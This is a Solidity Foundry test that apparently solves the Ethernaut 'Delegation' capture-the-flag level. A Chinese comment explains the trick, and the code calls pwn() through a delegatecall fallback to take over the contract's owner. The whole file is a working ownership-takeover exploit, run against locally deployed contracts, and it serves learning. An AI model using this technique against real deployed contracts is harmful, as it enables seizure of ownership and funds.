pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";


/** 
 * 解题思路：直接通过对 Delegate 的 pwn 调用就可以，通过调用 pwn 方法来获取合约的 owner 权限
 * 获取 pwn() 方法的签名，然后发起调用即可
 */
contract DelegationHackTest is Test {
    address hacker = address(hacker);
    address owner = address(111111111);
    Delegate public d1;
    Delegation public d2;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        d1 = new Delegate(owner);
        d2 = new Delegation(address(d1));
    }
    function testHackDelegation() public {
        vm.startPrank(hacker);
         console.log("before Delegate owner:");
        console.logAddress(d2.owner());
        address(d2).call{value: 0}(abi.encodeWithSignature("pwn()"));
        console.log("Delegate owner:");
        console.logAddress(d2.owner());
        vm.stopPrank();
    }
}